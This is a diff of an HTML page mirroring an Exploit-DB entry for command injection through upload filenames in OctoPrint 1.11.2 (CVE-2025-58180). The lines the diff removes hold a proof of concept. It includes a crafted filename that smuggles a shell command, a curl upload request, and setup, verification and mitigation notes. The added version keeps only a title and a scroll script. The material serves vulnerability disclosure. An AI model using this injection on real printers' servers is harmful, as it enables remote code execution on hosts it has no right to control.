@@ -1,124 +1,45 @@
 <!DOCTYPE html>
-<html lang="ron">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>OffSec’s Exploit Database Archive</title>
+<title>[webapps] OctoPrint 1.11.2 - File Upload</title>
 <style>
-  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.8; color: #e2e8f0; max-width: 800px; margin: 40px auto; padding: 0 20px; background: #0a0e27; }
-  h1 { color: #00d9ff; margin-bottom: 0.5em; }
-  .metadata { color: #94a3b8; font-size: 0.9em; margin-bottom: 2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 1em; }
-  img { max-width: 100%; height: auto; border-radius: 8px; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.55; color: #e2e8f0; max-width: 800px; margin: 26px auto; padding: 0 18px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.35em; line-height: 1.22; font-size: clamp(1.45rem, 2.1vw, 1.95rem); font-weight: 700; }
+  .metadata { color: #94a3b8; font-size: 0.86em; margin-bottom: 1.2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 0.7em; }
+  p { margin-bottom: 0.72em; line-height: 1.58; }
+  img { max-width: 100%; width: auto !important; height: auto !important; object-fit: contain !important; border-radius: 8px; display: block; margin: 0.6em auto; }
   a { color: #00d9ff; }
-  p { margin-bottom: 1em; }
-  blockquote { border-left: 3px solid #825ee4; padding-left: 15px; color: #94a3b8; }
-  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
-  pre { background: rgba(0,0,0,0.4); padding: 15px; border-radius: 6px; overflow-x: auto; }
-
   .article-elevator { position: fixed; right: 14px; bottom: 14px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
   .article-elevator-btn { width: 36px; height: 36px; border: 1px solid rgba(0,217,255,0.35); border-radius: 10px; background: rgba(10,14,39,0.88); color: #00d9ff; cursor: pointer; font-size: 16px; line-height: 1; }
   .article-elevator-btn:hover { background: rgba(10,14,39,1); }
-
 </style>
 </head>
 <body>
-  <h1>OffSec’s Exploit Database Archive</h1>
+  <h1>[webapps] OctoPrint 1.11.2 - File Upload</h1>
   <div class="metadata">
-    Source: Exploit-DB | Date: 2/4/2026 | Lang: RON |
-    <a href="https://www.exploit-db.com/exploits/52476" target="_blank">Original Article</a>
+    Source: Exploit-DB | Date: 2/4/2026 1:00:00 AM | <a href="https://www.exploit-db.com/exploits/52476" target="_blank" rel="noopener noreferrer">Lien</a> | Lang: EN
   </div>
   <div class="content">
-    <div><div>
-
-                        
-                        <pre><code># Exploit Title: OctoPrint 1.11.2 - File Upload 
-# Date: 2025-09-28
-# Exploit Author: prabhatverma.addada
-# Vendor Homepage: https://octoprint.org
-# Software Link: https://github.com/OctoPrint/OctoPrint
-# Affected Version(s): &lt;= 1.11.2
-# Patched Version(s): 1.11.3
-# CVE: CVE-2025-58180
-# CVSS (per advisory): 7.5
-# Platform: Linux / OctoPrint server
-# Type: Remote Code Execution (requires authenticated upload / API key or session)
-#
-# Short description:
-# An authenticated attacker with file-upload access can craft a filename containing shell metacharacters (e.g. ';', ${IFS}) which bypasses filename
-# sanitization and, when interpolated into a configured system event handler command, results in arbitrary command execution on the host.
-#
-# Scope &amp; privileges:
-# - Trigger privileges: Authenticated file-upload (API key or valid session). NO admin/root required to trigger the attack.
-# - Precondition: A system event handler that executes shell commands using filename/path placeholders must be configured by an administrator.
-#
-# Tested on:
-# - OctoPrint 1.11.2 running via `octoprint serve --port 5000` on Ubuntu 22.04
-#
-# Reproduction / PoC (manual):
-#
-# 1) Start OctoPrint 1.11.2:
-#    octoprint serve --port 5000 --debug
-#    Complete initial setup at http://127.0.0.1:5000 and create an admin user.
-#
-# 2) Configure a system event handler that runs shell commands with filename placeholders:
-#    Edit ~/.octoprint/config.yaml and add:
-#
-#    events:
-#      enabled: true
-#      subscriptions:
-#        - event: FileAdded
-#          type: system
-#          debug: true
-#          command: "{path}"
-#
-#    Restart OctoPrint.
-#
-# 3) Create a harmless test gcode:
-#    mkdir -p /tmp/gcode
-#    cat &gt; /tmp/gcode/ok.gcode &lt;&lt;'EOF'
-#    ; minimal gcode
-#    G28
-#    M105
-#    EOF
-#
-# 4) Obtain API key from Settings -&gt; API and export it:
-#    export API_KEY='&lt;your_api_key_here&gt;'
-#
-# 5) Ensure target proof file does not exist:
-#    ls -la /tmp/test123
-#
-# 6) PoC upload (non-destructive proof):
-#    INJECT_NAME='octo;touch${IFS}/tmp/test123;#.gcode'
-#
-#    curl -sS -X POST -H "X-Api-Key: $API_KEY" \
-#      -F "file=@/tmp/gcode/ok.gcode;filename=\"${INJECT_NAME}\"" \
-#      "http://127.0.0.1:5000/api/files/local"
-#
-# 7) Verify execution:
-#    ls -la /tmp/test123
-#    If /tmp/test123 exists, the injected command executed and RCE is demonstrated.
-#
-# Explanation:
-# - OctoPrint accepted the uploaded filename (sanitize_name allowed these characters in default config).
-# - FileAdded event payload contains the filename/path.
-# - A system event subscriber executed a shell command with that placeholder via subprocess with shell=True and without placeholder escaping.
-# - Shell metacharacters in the filename are interpreted by the shell and executed.
-#
-# Mitigations / Workarounds:
-# - Upgrade OctoPrint to 1.11.3 (patched).
-# - Disable event handlers using filename placeholders (set enabled: false or uncheck in GUI Event Manager).
-# - Set feature.enforceReallyUniversalFilenames: true in config.yaml and vet existing uploads.
-# - Do not expose OctoPrint to hostile networks; restrict upload access.
-#
-# References:
-# - GitHub Security Advisory: https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-49mj-x8jp-qvfc
-# - PoC repo: https://github.com/prabhatverma47/CVE-2025-58180
-#
-# Notes for triage:
-# - Exploit requires only authenticated upload privileges to trigger. No admin/root required to perform the attack.
-# - PoC uses non-destructive `touch /tmp/test123`.
-            </code></pre>
-
-                    </div></div>
+    <p>OctoPrint 1.11.2 - File Upload</p>
   </div>
+  <div class="article-elevator" aria-label="Navigation article">
+    <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollToBottom()">▼</button>
+  </div>
+  <script>
+    function scrollToTop() {
+      window.scrollTo({ top: 0, behavior: 'auto' });
+    }
+    function scrollToBottom() {
+      window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'auto' });
+    }
+    window.addEventListener('message', (event) => {
+      const data = event && event.data;
+      if (!data || data.type !== 'AI_PULSE_SCROLL') return;
+      if (data.direction === 'up' || data.direction === 'top') scrollToTop();
+      if (data.direction === 'down' || data.direction === 'bottom') scrollToBottom();
+    });
+  </script>
 </body>
 </html>
